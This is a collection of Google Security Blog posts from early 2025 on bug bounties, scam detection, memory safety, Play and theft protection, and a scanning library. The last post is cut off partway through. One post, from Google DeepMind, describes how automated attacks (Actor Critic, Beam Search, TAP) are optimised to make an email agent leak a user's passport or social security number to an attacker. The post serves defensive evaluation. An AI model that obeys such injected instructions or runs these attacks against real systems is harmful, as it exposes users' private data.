{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Vulnerability Reward Program: 2024 in Review", "url": "http://security.googleblog.com/2025/03/vulnerability-reward-program-2024-in.html", "published": "2025-03-07T14:09:00.010-05:00", "content": "In 2024, our Vulnerability Reward Program confirmed the ongoing value of engaging with the security research community to make Google and its products safer. This was evident as we awarded just shy of $12 million to over 600 researchers based in countries around the globe across all of our programs.\nVulnerability Reward Program 2024 in Numbers\nYou can learn about who’s reporting to the Vulnerability Reward Program via our Leaderboard – and find out more about our youngest security researchers who’ve recently joined the ranks of Google bug hunters.\nVRP Highlights in 2024\nIn 2024 we made a series of changes and improvements coming to our vulnerability reward programs and related initiatives:\nThe Google VRP revamped its reward structure, bumping rewards up to a maximum of $151,515, the Mobile VRP is now offering up to $300,000 for critical vulnerabilities in top-tier apps, Cloud VRP has a top-tier award of up $151,515, and Chrome awards now peak at $250,000 (see the below section on Chrome for details).\nWe rolled out InternetCTF – to get rewarded, discover novel code execution vulnerabilities in open source and provide Tsunami plugin patches for them.\nThe Abuse VRP saw a 40% YoY increase in payouts – we received over 250 valid bugs targeting abuse and misuse issues in Google products, resulting in over $290,000 in rewards.\nTo improve the payment process for rewards going to bug hunters, we introduced Bugcrowd as an additional payment option on bughunters.google.com alongside the existing standard Google payment option.\nWe hosted two editions of bugSWAT for training, skill sharing, and, of course, some live hacking – in August, we had 16 bug hunters in attendance in Las Vegas, and in October, as part of our annual security conference ESCAL8 in Malaga, Spain, we welcomed 40 of our top researchers. Between these two events, our bug hunters were rewarded $370,000 (and plenty of swag).\nWe doubled down on our commitment to support the next generation of security engineers by hosting four init.g workshops (Las Vegas, São Paulo, Paris, and Malaga). Follow the Google VRP channel on X to stay tuned on future events.\nMore detailed updates on selected programs are shared in the following sections.\nAndroid and Google Devices\nIn 2024, the Android and Google Devices Security Reward Program and the Google Mobile Vulnerability Reward Program, both part of the broader Google Bug Hunters program, continued their mission to fortify the Android ecosystem, achieving new heights in both impact and severity. We awarded over $3.3 million in rewards to researchers who demonstrated exceptional skill in uncovering critical vulnerabilities within Android and Google mobile applications.\nThe above numbers mark a significant change compared to previous years. Although we saw an 8% decrease in the total number of submissions, there was a 2% increase in the number of critical and high vulnerabilities. In other words, fewer researchers are submitting fewer, but more impactful bugs, and are citing the improved security posture of the Android operating system as the central challenge. This showcases the program's sustained success in hardening Android.\nThis year, we had a heightened focus on Android Automotive OS and WearOS, bringing actual automotive devices to multiple live hacking events and conferences. At ESCAL8, we hosted a live-hacking challenge focused on Pixel devices, resulting in over $75,000 in rewards in one weekend, and the discovery of several memory safety vulnerabilities. To facilitate learning, we launched a new Android hacking course in collaboration with external security researchers, focused on mobile app security, designed for newcomers and veterans alike. Stay tuned for more.\nWe extend our deepest gratitude to the dedicated researchers who make the Android ecosystem safer. We're proud to work with you! Special thanks to Zinuo Han (@ele7enxxh) for their expertise in Bluetooth security, blunt (@blunt_qian) for holding the record for the most valid reports submitted to the Google Play Security Reward Program, and WANG,YONG (@ThomasKing2014) for groundbreaking research on rooting Android devices with kernel MTE enabled. We also appreciate all researchers who participated in last year's bugSWAT event in Málaga. Your contributions are invaluable!\nChrome\nChrome did some remodeling in 2024 as we updated our reward amounts and structure to incentivize deeper research. For example, we increased our maximum reward for a single issue to $250,000 for demonstrating RCE in the browser or other non-sandboxed process, and more if done directly without requiring a renderer compromise.\nIn 2024, UAF mitigation MiraclePtr was fully launched across all platforms, and a year after the initial launch, MiraclePtr-protected bugs are no longer being considered exploitable security bugs. In tandem, we increased the MiraclePtr Bypass Reward to $250,128. Between April and November, we also launched the first and second iterations of the V8 Sandbox Bypass Rewards as part of the progression towards the V8 sandbox, eventually becoming a security boundary in Chrome.\nWe received 337 reports of unique, valid security bugs in Chrome during 2024, and awarded 137 Chrome VRP researchers $3.4 million in total. The highest single reward of 2024 was $100,115 and was awarded to Mickey for their report of a MiraclePtr Bypass after MiraclePtr was initially enabled across most platforms in Chrome M115 in 2023. We rounded out the year by announcing the top 20 Chrome VRP researchers for 2024, all of whom were gifted new Chrome VRP swag, featuring our new Chrome VRP mascot, Bug.\nCloud VRP\nThe Cloud VRP launched in October as a Cloud-focused vulnerability reward program dedicated to Google Cloud products and services. As part of the launch, we also updated our product tiering and improved our reward structure to better align our reports with their impact on Google Cloud. This resulted in over 150 Google Cloud products coming under the top two reward tiers, enabling better rewards for our Cloud researchers and a more secure cloud.\nSince its launch, Google Cloud VRP triaged over 400 reports and filed over 200 unique security vulnerabilities for Google Cloud products and services leading to over $500,000 in researcher rewards.\nOur highlight last year was launching at the bugSWAT event in Málaga where we got to meet many of our amazing researchers who make our program so successful! The overwhelming positive feedback from the researcher community continues to propel us to mature Google Cloud VRP further this year. Stay tuned for some exciting announcements!\nGenerative AI\nWe’re celebrating an exciting first year of AI bug bounties. We received over 150 bug reports – over $55,000 in rewards so far – with one-in-six leading to key improvements.\nWe also ran a bugSWAT live-hacking event targeting LLM products and received 35 reports, totaling more than $87,000 – including issues like “Hacking Google Bard - From Prompt Injection to Data Exfiltration” and “We Hacked Google A.I. for $50,000”.\nKeep an eye on Gen AI in 2025 as we focus on expanding scope and sharing additional ways for our researcher community to contribute.\nLooking Forward to 2025\nIn 2025, we will be celebrating 15 years of VRP at Google, during which we have remained fully committed to fostering collaboration, innovation, and transparency with the security community, and will continue to do so in the future. Our goal remains to stay ahead of emerging threats, adapt to evolving technologies, and continue to strengthen the security posture of Google’s products and services.\nWe want to send a huge thank you to our bug hunter community for helping us make Google products and platforms more safe and secure for our users around the world – and invite researchers not yet engaged with the Vulnerability Reward Program to join us in our mission to keep Google safe!\nThank you to Dirk Göhmann, Amy Ressler, Eduardo Vela, Jan Keller, Krzysztof Kotowicz, Martin Straka, Michael Cote, Mike Antares, Sri Tulasiram, and Tony Mendez.\nTip: Want to be informed of new developments and events around our Vulnerability Reward Program? Follow the Google VRP channel on X to stay in the loop and be sure to check out the Security Engineering blog, which covers topics ranging from VRP updates to security practices and vulnerability descriptions (30 posts in 2024)!\nPost a Comment", "timestamp": "2025-10-21T13:34:01.527049"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "New AI-Powered Scam Detection Features to Help Protect You on Android", "url": "http://security.googleblog.com/2025/03/new-ai-powered-scam-detection-features.html", "published": "2025-03-04T11:59:00.000-05:00", "content": "Google has been at the forefront of protecting users from the ever-growing threat of scams and fraud with cutting-edge technologies and security expertise for years. In 2024, scammers used increasingly sophisticated tactics and generative AI-powered tools to steal more than $1 trillion from mobile consumers globally, according to the Global Anti-Scam Alliance. And with the majority of scams now delivered through phone calls and text messages, we’ve been focused on making Android’s safeguards even more intelligent with powerful Google AI to help keep your financial information and data safe.\nToday, we’re launching two new industry-leading AI-powered scam detection features for calls and text messages, designed to protect users from increasingly complex and damaging scams. These features specifically target conversational scams, which can often appear initially harmless before evolving into harmful situations. To enhance our detection capabilities, we partnered with financial institutions around the world to better understand the latest advanced and most common scams their customers are facing. For example, users are experiencing more conversational text scams that begin innocently, but gradually manipulate victims into sharing sensitive data, handing over funds, or switching to other messaging apps. And more phone calling scammers are using spoofing techniques to hide their real numbers and pretend to be trusted companies.\nTraditional spam protections are focused on protecting users before the conversation starts, and are less effective against these latest tactics from scammers that turn dangerous mid-conversation and use social engineering techniques. To better protect users, we invested in new, intelligent AI models capable of detecting suspicious patterns and delivering real-time warnings over the course of a conversation, all while prioritizing user privacy.\nWe’re building on our enhancements to existing Spam Protection in Google Messages that strengthen defenses against job and delivery scams, which are continuing to roll out to users. We’re now introducing Scam Detection to detect a wider range of fraudulent activities. Scam Detection in Google Messages uses powerful Google AI to proactively address conversational scams by providing real-time detection even after initial messages are received. When the on-device AI detects a suspicious pattern in SMS, MMS, and RCS messages, users will now get a message warning of a likely scam with an option to dismiss or report and block the sender.\nAs part of the Spam Protection setting, Scam Detection on Google Messages is on by default and only applies to conversations with non-contacts. Your privacy is protected with Scam Detection in Google Messages, with all message processing remaining on-device. Your conversations remain private to you; if you choose to report a conversation to help reduce widespread spam, only sender details and recent messages with that sender are shared with Google and carriers. You can turn off Spam Protection, which includes Scam Detection, in your Google Messages at any time.\nScam Detection in Google Messages is launching in English first in the U.S., U.K. and Canada and will expand to more countries soon.\nMore than half of Americans reported receiving at least one scam call per day in 2024. To combat the rise of sophisticated conversational scams that deceive victims over the course of a phone call, we introduced Scam Detection late last year to U.S.-based English-speaking Phone by Google public beta users on Pixel phones.\nWe use AI models processed on-device to analyze conversations in real-time and warn users of potential scams. If a caller, for example, tries to get you to provide payment via gift cards to complete a delivery, Scam Detection will alert you through audio and haptic notifications and display a warning on your phone that the call may be a scam.\nDuring our limited beta, we analyzed calls with Gemini Nano, Google’s built-in, on-device foundation model, on Pixel 9 devices and used smaller, robust on-device machine-learning models for Pixel 6+ users. Our testing showed that Gemini Nano outperformed other models, so as a result, we're currently expanding the availability of the beta to bring the most capable Scam Detection to all English-speaking Pixel 9+ users in the U.S.\nSimilar to Scam Detection in messaging, we built this feature to protect your privacy by processing everything on-device. Call audio is processed ephemerally and no conversation audio or transcription is recorded, stored on the device, or sent to Google or third parties. Scam Detection in Phone by Google is off by default to give users control over this feature, as phone call audio is more ephemeral compared to messages, which are stored on devices. Scam Detection only applies to calls that could potentially be scams, and is never used during calls with your contacts. If enabled, Scam Detection will beep at the start and during the call to notify participants the feature is on. You can turn off Scam Detection at any time, during an individual call or for all future calls.\nAccording to our research and a Scam Detection beta user survey, these types of alerts have already helped people be more cautious on the phone, detect suspicious activity, and avoid falling victim to conversational scams.\nWith AI-powered innovations like Scam Detection in Messages and Phone by Google, we're giving you more tools to stay one step ahead of bad actors. We're constantly working with our partners across the Android ecosystem to help bring new security features to even more users. Together, we’re always working to keep you safe on Android.\nBased on third-party research funded by Google LLC in Feb 2025 comparing the Pixel 9 Pro, iPhone 16 Pro, Samsung S24+ and Xiaomi 14 Ultra. Evaluation based on no-cost smartphone features enabled by default. Some features may not be available in all countries. ↩\nPost a Comment", "timestamp": "2025-10-21T13:34:02.211408"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Securing tomorrow's software: the need for memory safety standards", "url": "http://security.googleblog.com/2025/02/securing-tomorrows-software-need-for.html", "published": "2025-02-25T15:04:00.000-05:00", "content": "For decades, memory safety vulnerabilities have been at the center of various security incidents across the industry, eroding trust in technology and costing billions. Traditional approaches, like code auditing, fuzzing, and exploit mitigations – while helpful – haven't been enough to stem the tide, while incurring an increasingly high cost.\nIn this blog post, we are calling for a fundamental shift: a collective commitment to finally eliminate this class of vulnerabilities, anchored on secure-by-design practices – not just for ourselves but for the generations that follow.\nThe shift we are calling for is reinforced by a recent ACM article calling to standardize memory safety we took part in releasing with academic and industry partners. It's a recognition that the lack of memory safety is no longer a niche technical problem but a societal one, impacting everything from national security to personal privacy.\nThe standardization opportunity\nOver the past decade, a confluence of secure-by-design advancements has matured to the point of practical, widespread deployment. This includes memory-safe languages, now including high-performance ones such as Rust, as well as safer language subsets like Safe Buffers for C++.\nThese tools are already proving effective. In Android for example, the increasing adoption of memory-safe languages like Kotlin and Rust in new code has driven a significant reduction in vulnerabilities.\nLooking forward, we're also seeing exciting and promising developments in hardware. Technologies like ARM's Memory Tagging Extension (MTE) and the Capability Hardware Enhanced RISC Instructions (CHERI) architecture offer a complementary defense, particularly for existing code.\nWhile these advancements are encouraging, achieving comprehensive memory safety across the entire software industry requires more than just individual technological progress: we need to create the right environment and accountability for their widespread adoption. Standardization is key to this.\nTo facilitate standardization, we suggest establishing a common framework for specifying and objectively assessing memory safety assurances; doing so will lay the foundation for creating a market in which vendors are incentivized to invest in memory safety. Customers will be empowered to recognize, demand, and reward safety. This framework will provide governments and businesses with the clarity to specify memory safety requirements, driving the procurement of more secure systems.\nThe framework we are proposing would complement existing efforts by defining specific, measurable criteria for achieving different levels of memory safety assurance across the industry. In this way, policymakers will gain the technical foundation to craft effective policy initiatives and incentives promoting memory safety.\nA blueprint for a memory-safe future\nWe know there's more than one way of solving this problem, and we are ourselves investing in several. Importantly, our vision for achieving memory safety through standardization focuses on defining the desired outcomes rather than locking ourselves into specific technologies.\nTo translate this vision into an effective standard, we need a framework that will:\nFoster innovation and support diverse approaches: The standard should focus on the security properties we want to achieve (e.g., freedom from spatial and temporal safety violations) rather than mandating specific implementation details. The framework should therefore be technology-neutral, allowing vendors to choose the best approach for their products and requirements. This encourages innovation and allows software and hardware manufacturers to adopt the best solutions as they emerge.\nTailor memory safety requirements based on need: The framework should establish different levels of safety assurance, akin to SLSA levels, recognizing that different applications have different security needs and cost constraints. Similarly, we likely need distinct guidance for developing new systems and improving existing codebases. For instance, we probably do not need every single piece of code to be formally proven. This allows for tailored security, ensuring appropriate levels of memory safety for various contexts.\nEnable objective assessment: The framework should define clear criteria and potentially metrics for assessing memory safety and compliance with a given level of assurance. The goal would be to objectively compare the memory safety assurance of different software components or systems, much like we assess energy efficiency today. This will move us beyond subjective claims and towards objective and comparable security properties across products.\nBe practical and actionable: Alongside the technology-neutral framework, we need best practices for existing technologies. The framework should provide guidance on how to effectively leverage specific technologies to meet the standards. This includes answering questions such as when and to what extent unsafe code is acceptable within larger software systems, and guidelines on structuring such unsafe dependencies to support compositional reasoning about safety.\nGoogle's commitment\nAt Google, we're not just advocating for standardization and a memory-safe future, we're actively working to build it.\nWe are collaborating with industry and academic partners to develop potential standards, and our joint authorship of the recent CACM call-to-action marks an important first step in this process. In addition, as outlined in our Secure by Design whitepaper and in our memory safety strategy, we are deeply committed to building security into the foundation of our products and services.\nThis commitment is also reflected in our internal efforts. We are prioritizing memory-safe languages, and have already seen significant reductions in vulnerabilities by adopting languages like Rust in combination with existing, wide-spread usage of Java, Kotlin, and Go where performance constraints permit. We recognize that a complete transition to those languages will take time. That's why we're also investing in techniques to improve the safety of our existing C++ codebase by design, such as deploying hardened libc++.\nLet's build a memory-safe future together\nThis effort isn't about picking winners or dictating solutions. It's about creating a level playing field, empowering informed decision-making, and driving a virtuous cycle of security improvement. It's about enabling a future where:\nDevelopers and vendors can confidently build more secure systems, knowing their efforts can be objectively assessed.\nBusinesses can procure memory-safe products with assurance, reducing their risk and protecting their customers.\nGovernments can effectively protect critical infrastructure and incentivize the adoption of secure-by-design practices.\nConsumers are empowered to make decisions about the services they rely on and the devices they use with confidence – knowing the security of each option was assessed against a common framework.\nThe journey towards memory safety requires a collective commitment to standardization. We need to build a future where memory safety is not an afterthought but a foundational principle, a future where the next generation inherits a digital world that is secure by design.\nAcknowledgments\nWe'd like to thank our CACM article co-authors for their invaluable contributions: Robert N. M. Watson, John Baldwin, Tony Chen, David Chisnall, Jessica Clarke, Brooks Davis, Nathaniel Wesley Filardo, Brett Gutstein, Graeme Jenkinson, Christoph Kern, Alfredo Mazzinghi, Simon W. Moore, Peter G. Neumann, Hamed Okhravi, Peter Sewell, Laurence Tratt, Hugo Vincent, and Konrad Witaszczyk, as well as many others.\nPost a Comment", "timestamp": "2025-10-21T13:34:02.901477"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "How we kept the Google Play & Android app ecosystems safe in 2024", "url": "http://security.googleblog.com/2025/01/how-we-kept-google-play-android-app-ecosystem-safe-2024.html", "published": "2025-01-29T12:59:00.002-05:00", "content": "Android and Google Play comprise a vibrant ecosystem with billions of users around the globe and millions of helpful apps. Keeping this ecosystem safe for users and developers remains our top priority. However, like any flourishing ecosystem, it also attracts its share of bad actors. That’s why every year, we continue to invest in more ways to protect our community and fight bad actors, so users can trust the apps they download from Google Play and developers can build thriving businesses.\nLast year, those investments included AI-powered threat detection, stronger privacy policies, supercharged developer tools, new industry-wide alliances, and more. As a result, we prevented 2.36 million policy-violating apps from being published on Google Play and banned more than 158,000 bad developer accounts that attempted to publish harmful apps.\nBut that was just the start. For more, take a look at our recent highlights from 2024:\nThat’s enabled us to stop more bad apps than ever from reaching users through the Play Store, protecting users from harmful or malicious apps before they can cause any damage.\nTo protect user privacy, we’re working with developers to reduce unnecessary access to sensitive data. In 2024, we prevented 1.3 million apps from getting excessive or unnecessary access to sensitive user data. We also required apps to be more transparent about how they handle user information by launching new developer requirements and a new “Data deletion” option for apps that support user accounts and data collection. This helps users manage their app data and understand the app’s deletion practices, making it easier for Play users to delete data collected from third-party apps.\nWe also worked to ensure that apps use the strongest and most up-to-date privacy and security capabilities Android has to offer. Every new version of Android introduces new security and privacy features, and we encourage developers to embrace these advancements as soon as possible. As a result of partnering closely with developers, over 91% of app installs on the Google Play Store now use the latest protections of Android 13 or newer. Safeguarding apps from scams and fraud is an ongoing battle for developers. The Play Integrity API allows developers to check if their apps have been tampered with or are running in potentially compromised environments, helping them to prevent abuse like fraud, bots, cheating, and data theft. Play Integrity API and Play’s automatic protection helps developers ensure that users are using the official Play version of their app with the latest security updates. Apps using Play integrity features are seeing 80% lower usage from unverified and untrusted sources on average.\nWe’re also constantly working to improve the safety of apps on Play at scale, such as with the Google Play SDK Index. This tool offers insights and data to help developers make more informed decisions about the safety of an SDK. Last year, in addition to adding 80 SDKs to the index, we also worked closely with SDK and app developers to address potential SDK security and privacy issues, helping to build safer and more secure apps for Google Play.\nGoogle Play Protect automatically scans every app on Android devices with Google Play Services, no matter the download source. This built-in protection, enabled by default, provides crucial security against malware and unwanted software. Google Play Protect scans more than 200 billion apps daily and performs real-time scanning at the code-level on novel apps to combat emerging and hidden threats, like polymorphic malware. In 2024, Google Play Protect’s real-time scanning identified more than 13 million new malicious apps from outside Google Play1.\nGoogle Play Protect is always evolving to combat new threats and protect users from harmful apps that can lead to scams and fraud. Here are some of the new improvements that are now available globally on Android devices with Google Play Services:\nGoogle Play Protect’s enhanced fraud protection pilot analyzes and automatically blocks the installation of apps that may use sensitive permissions frequently abused for financial fraud when the user attempts to install the app from an Internet-sideloading source (web browsers, messaging apps, or file managers). Building on the success of our initial pilot in partnership with the Cyber Security Agency of Singapore (CSA), additional enhanced fraud protection pilots are now active in nine regions – Brazil, Hong Kong, India, Kenya, Nigeria, Philippines, South Africa, Thailand, and Vietnam.\nIn 2024, Google Play Protect’s enhanced fraud protection pilots have shielded 10 million devices from over 36 million risky installation attempts, encompassing over 200,000 unique apps. By piloting these new protections, we can proactively combat emerging threats and refine our solutions to thwart scammers and their increasingly sophisticated fraud attempts. We look forward to continuing to partner with governments, ecosystem partners, and other stakeholders to improve user protections.\nIn 2024, we introduced a new badge for government developers to help users around the world identify official government apps. Government apps are often targets of impersonation due to the highly sensitive nature of the data users provide, giving bad actors the ability to steal identities and commit financial fraud. Badging verified government apps is an important step in helping connect people with safe, high-quality, useful, and relevant experiences. We partner closely with global governments and are already exploring ways to build on this work.\nWe also recently introduced a new badge to help Google Play users discover VPN apps that take extra steps to demonstrate their strong commitment to security. We allow developers who adhere to Play safety and security guidelines and have passed an additional independent Mobile Application Security Assessment (MASA) to display a dedicated badge in the Play Store to highlight their increased commitment to safety.\nIn addition to our partnerships with governments, developers, and other stakeholders, we also worked with our industry peers to protect the entire app ecosystem for everyone. The App Defense Alliance, in partnership with fellow steering committee members Microsoft and Meta, recently launched the ADA Application Security Assessment (ASA) v1.0, a new standard to help developers build more secure mobile, web, and cloud applications. This standard provides clear guidance on protecting sensitive data, defending against cyberattacks, and ultimately, strengthening user trust. This marks a significant step forward in establishing industry-wide security best practices for application development.\nAll developers are encouraged to review and comply with the new mobile security standard. You’ll see this standard in action for all carrier apps pre-installed on future Pixel phone models.\nThis year, we’ll continue to protect the Android and Google Play ecosystem, building on these tools and resources in response to user and developer feedback and the changing landscape. As always, we’ll keep empowering developers to build safer apps more easily, streamline their policy experience, and protect their businesses and users from bad actors.\n1 Based on Google Play Protect 2024 internal data.\nPost a Comment", "timestamp": "2025-10-21T13:34:03.755987"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "How we estimate the risk from prompt injection attacks on AI systems", "url": "http://security.googleblog.com/2025/01/how-we-estimate-risk-from-prompt.html", "published": "2025-01-29T05:00:00.003-05:00", "content": "Modern AI systems, like Gemini, are more capable than ever, helping retrieve data and perform actions on behalf of users. However, data from external sources present new security challenges if untrusted sources are available to execute instructions on AI systems. Attackers can take advantage of this by hiding malicious instructions in data that are likely to be retrieved by the AI system, to manipulate its behavior. This type of attack is commonly referred to as an \"indirect prompt injection,\" a term first coined by Kai Greshake and the NVIDIA team.\nTo mitigate the risk posed by this class of attacks, we are actively deploying defenses within our AI systems along with measurement and monitoring tools. One of these tools is a robust evaluation framework we have developed to automatically red-team an AI system’s vulnerability to indirect prompt injection attacks. We will take you through our threat model, before describing three attack techniques we have implemented in our evaluation framework.\nThreat model and evaluation framework\nOur threat model concentrates on an attacker using indirect prompt injection to exfiltrate sensitive information, as illustrated above. The evaluation framework tests this by creating a hypothetical scenario, in which an AI agent can send and retrieve emails on behalf of the user. The agent is presented with a fictitious conversation history in which the user references private information such as their passport or social security number. Each conversation ends with a request by the user to summarize their last email, and the retrieved email in context.\nThe contents of this email are controlled by the attacker, who tries to manipulate the agent into sending the sensitive information in the conversation history to an attacker-controlled email address. The attack is successful if the agent executes the malicious prompt contained in the email, resulting in the unauthorized disclosure of sensitive information. The attack fails if the agent only follows user instructions and provides a simple summary of the email.\nAutomated red-teaming\nCrafting successful indirect prompt injections requires an iterative process of refinement based on observed responses. To automate this process, we have developed a red-team framework consisting of several optimization-based attacks that generate prompt injections (in the example above this would be different versions of the malicious email). These optimization-based attacks are designed to be as strong as possible; weak attacks do little to inform us of the susceptibility of an AI system to indirect prompt injections.\nOnce these prompt injections have been constructed, we measure the resulting attack success rate on a diverse set of conversation histories. Because the attacker has no prior knowledge of the conversation history, to achieve a high attack success rate the prompt injection must be capable of extracting sensitive user information contained in any potential conversation contained in the prompt, making this a harder task than eliciting generic unaligned responses from the AI system. The attacks in our framework include:\nActor Critic: This attack uses an attacker-controlled model to generate suggestions for prompt injections. These are passed to the AI system under attack, which returns a probability score of a successful attack. Based on this probability, the attack model refines the prompt injection. This process repeats until the attack model converges to a successful prompt injection.\nBeam Search: This attack starts with a naive prompt injection directly requesting that the AI system send an email to the attacker containing the sensitive user information. If the AI system recognizes the request as suspicious and does not comply, the attack adds random tokens to the end of the prompt injection and measures the new probability of the attack succeeding. If the probability increases, these random tokens are kept, otherwise they are removed, and this process repeats until the combination of the prompt injection and random appended tokens result in a successful attack.Tree of Attacks w/ Pruning (TAP): Mehrotra et al. (2024) [3] designed an attack to generate prompts that cause an AI system to violate safety policies (such as generating hate speech). We adapt this attack, making several adjustments to target security violations. Like Actor Critic, this attack searches in the natural language space; however, we assume the attacker cannot access probability scores from the AI system under attack, only the text samples that are generated.\nWe are actively leveraging insights gleaned from these attacks within our automated red-team framework to protect current and future versions of AI systems we develop against indirect prompt injection, providing a measurable way to track security improvements. A single silver bullet defense is not expected to solve this problem entirely. We believe the most promising path to defend against these attacks involves a combination of robust evaluation frameworks leveraging automated red-teaming methods, alongside monitoring, heuristic defenses, and standard security engineering solutions.\nWe would like to thank Vijay Bolina, Sravanti Addepalli, Lihao Liang, and Alex Kaskasoli for their prior contributions to this work.\nPosted on behalf of the entire Google DeepMind Agentic AI Security team (listed in alphabetical order):\nAneesh Pappu, Andreas Terzis, Chongyang Shi, Gena Gibson, Ilia Shumailov, Itay Yona, Jamie Hayes, John \"Four\" Flynn, Juliette Pluto, Sharon Lin, Shuang Song\nPost a Comment", "timestamp": "2025-10-21T13:34:04.518933"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Android enhances theft protection with Identity Check and expanded features", "url": "http://security.googleblog.com/2025/01/android-theft-protection-identity-check-expanded-features.html", "published": "2025-01-23T13:00:00.003-05:00", "content": "Today, people around the world rely on their mobile devices to help them stay connected with friends and family, manage finances, keep track of healthcare information and more – all from their fingertips. But a stolen device in the wrong hands can expose sensitive data, leaving you vulnerable to identity theft, financial fraud and privacy breaches.\nThis is why we recently launched Android theft protection, a comprehensive suite of features designed to protect you and your data at every stage – before, during, and after device theft. As part of our commitment to help you stay safe on Android, we’re expanding and enhancing these features to deliver even more robust protection to more users around the world.\nIdentity Check rolling out to Pixel and Samsung One UI 7 devices\nWe’re officially launching Identity Check, first on Pixel and Samsung Galaxy devices eligible for One UI 71, to provide better protection for your critical account and device settings. When you turn on Identity Check, your device will require explicit biometric authentication to access certain sensitive resources when you’re outside of trusted locations. Identity Check also enables enhanced protection for Google Accounts on all supported devices and additional security for Samsung Accounts on One UI 7 eligible Galaxy devices, making it much more difficult for an unauthorized attacker to take over accounts signed in on the device.\nAs part of enabling Identity Check, you can designate one or more trusted locations. When you’re outside of these trusted places, biometric authentication will be required to access critical account and device settings, like changing your device PIN or biometrics, disabling theft protection, or accessing Passkeys.\nIdentity Check is rolling out now to Pixel devices with Android 15 and will be available on One UI 7 eligible Galaxy devices in the coming weeks. It will roll out to supported Android devices from other manufacturers later this year.\nTheft Detection Lock: expanding AI-powered protection to more users\nOne of the top theft protection features introduced last year was Theft Detection Lock, which uses an on-device AI-powered algorithm to help detect when your phone may be forcibly taken from you. If the machine learning algorithm detects a potential theft attempt on your unlocked device, it locks your screen to keep thieves out.\nTheft Detection Lock is now fully rolled out to Android 10+ phones2 around the world.\nProtecting your Android device from theft\nWe're collaborating with the GSMA and industry experts to combat mobile device theft by sharing information, tools and prevention techniques. Stay tuned for an upcoming GSMA white paper, developed in partnership with the mobile industry, with more information on protecting yourself and your organization from device theft.\nWith the addition of Identity Check and the ongoing enhancements to our existing features, Android offers a robust and comprehensive set of tools to protect your devices and your data from theft. We’re dedicated to providing you with peace of mind, knowing your personal information is safe and secure.\nYou can turn on the new Android theft features by clicking here on a supported Android device. Learn more about our theft protection features by visiting our help center.\nTiming, availability and feature names may vary in One UI 7. ↩\nWith the exclusion for Android Go smartphones ↩\nPost a Comment", "timestamp": "2025-10-21T13:34:05.363091"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "OSV-SCALIBR: A library for Software Composition Analysis", "url": "http://security.googleblog.com/2025/01/osv-scalibr-library-for-software.html", "published": "2025-01-16T14:06:00.010-05:00", "content": "In December 2022, we announced OSV-Scanner, a tool to enable developers to easily scan for vulnerabilities in their open source dependencies. Together with the open source community, we’ve continued to build this tool, adding remediation features, as well as expanding ecosystem support to 11 programming languages and 20 package manager formats.\nToday, we’re excited to release OSV-SCALIBR (Software Composition Analysis LIBRary), an extensible library for SCA and file system scanning. OSV-SCALIBR combines Google’s internal vulnerability management expertise into one scanning library with significant new capabilities such as:\nSCA for installed packages, standalone binaries, as well as source code\nOSes package scanning on Linux (COS, Debian, Ubuntu, RHEL, and much more), Windows, and Mac\nArtifact and lockfile scanning in major language ecosystems (Go, Java, Javascript, Python, Ruby, and much more)\nVulnerability scanning tools such as weak credential detectors for Linux, Windows, and Mac\nSBOM generation in SPDX and CycloneDX, the two most popular document formats\nOptimization for on-host scanning of resource constrained environments where performance and low resource consumption is critical\nOSV-SCALIBR is now the primary SCA engine used within Google for live hosts, code repos, and containers. It’s been used and tested extensively across many different products and internal tools to help generate SBOMs, find vulnerabilities, and help protect our users’ data at Google scale.\nWe offer OSV-SCALIBR primarily as an open source Go library today, and we're working on adding its new capabilities into OSV-Scanner as the primary CLI interface.\nAll of OSV-SCALIBR's capabilities are modularized into plugins for software extraction and vulnerability detection which are very simple to expand.You can use OSV-SCALIBR as a library to:\n1.Generate SBOMs from the build artifacts and code repos on your live host:\nimport (\n\"context\"\n\"github.com/google/osv-scalibr\"\n\"github.com/google/osv-scalibr/converter\"\n\"github.com/google/osv-scalibr/extractor/filesystem/list\"\n\"github.com/google/osv-scalibr/fs\"\n\"github.com/google/osv-scalibr/plugin\"\nspdx \"github.com/spdx/tools-golang/spdx/v2/v2_3\"\n)\nfunc GenSBOM(ctx context.Context) *spdx.Document {\ncapab := &plugin.Capabilities{OS: plugin.OSLinux}\ncfg := &scalibr.ScanConfig{\nScanRoots: fs.RealFSScanRoots(\"/\"),\nFilesystemExtractors: list.FromCapabilities(capab),\nCapabilities: capab,\n}\nresult := scalibr.New().Scan(ctx, cfg)\nreturn converter.ToSPDX23(result, converter.SPDXConfig{})\n2. Scan a git repo for SBOMs:\nSimply replace \"/\" with the path to your git repo. Also take a look at the various language extractors to enable for code scanning.\n3. Scan a remote container for SBOMs:\nReplace the scan config from the above code snippet with\n...\n\"github.com/google/go-containerregistry/pkg/authn\"\n\"github.com/google/go-containerregistry/pkg/v1/remote\"\n\"github.com/google/osv-scalibr/artifact/image\"\nfilesys, _ := image.NewFromRemoteName(\n\"alpine:latest\",\nremote.WithAuthFromKeychain(authn.DefaultKeychain),\nScanRoots: []*fs.ScanRoot{{FS: filesys}},\n4. Find vulnerabilities on your filesystem or a remote container:\nExtract the PURLs from the SCALIBR inventory results from the previous steps:\nfor _, i := range result.Inventories {\nfmt.Println(converter.ToPURL(i))\nAnd send them to osv.dev, e.g.\n$ curl -d '{\"package\": {\"purl\": \"pkg:npm/dojo@1.2.3\"}}' \"https://api.osv.dev/v1/query\"\nSee the usage docs for more details.\nUsers looking for an out-of-the-box vulnerability scanning CLI tool should check out OSV-Scanner, which already provides comprehensive language package scanning capabilities using much of the same extraction as OSV-SCALIBR.\nSome of OSV-SCALIBR’s capabilities are not yet available in OSV-Scanner, but we’re currently working on integrating OSV-SCALIBR more deeply into OSV-Scanner. This will make more and more of OSV-SCALIBR’s capabilities available in OSV-Scanner in the next few months, including installed package extraction, weak credentials scanning, SBOM generation, and more.\nLook out soon for an announcement of OSV-Scanner V2 with many of these new features available. OSV-Scanner will become the primary frontend to the OSV-SCALIBR library for users who require a CLI interface. Existing users of OSV-Scanner can continue to use the tool the same way, with backwards compatibility maintained for all existing use cases.\nFor installation and usage instructions, have a look at OSV-Scanner’s documentation here.\nIn addition to making all of 